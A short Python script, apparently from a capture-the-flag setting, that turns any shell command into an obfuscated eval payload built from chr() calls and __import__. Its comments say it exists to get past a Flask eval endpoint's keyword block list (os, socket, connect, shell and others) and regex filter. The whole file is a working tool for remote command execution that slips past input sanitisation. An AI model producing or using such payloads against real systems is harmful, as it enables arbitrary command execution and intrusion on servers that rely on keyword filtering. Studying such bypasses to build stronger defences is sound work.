# This script encodes a shell command into a Python expression that can be executed using `os.popen` or `os.system`.
# Using it to bypass restrictions on direct command execution.
    
    # ------------
    # Secure python_flask eval execution by 
    #     1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
    #     2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'


def encode_command(cmd, method='popen'):
    ascii_list = [ord(c) for c in cmd]
    chr_expr = ','.join([f'chr({c})' for c in ascii_list])
    cmd_expr = f"''.join([{chr_expr}])"
    
    os_expr = "''.join([chr(111),chr(115)])"
    import_expr = "__import__('builtins').__import__"

    if method == 'popen': # Using popen to execute the command and read output
        final = f"{import_expr}({os_expr}).popen({cmd_expr}).read()"
    elif method == 'system': # Using system to execute the command without capturing output
        final = f"{import_expr}({os_expr}).system({cmd_expr})"
    else:
        raise ValueError("method must be 'popen' or 'system'")

    return final


if __name__ == "__main__":
    user_cmd = input("Enter shell command: ")  # e.g. cat /flag.txt, ls -la, etc.
    payload = encode_command(user_cmd, method='popen')
    print("Payload:")
    print(payload)
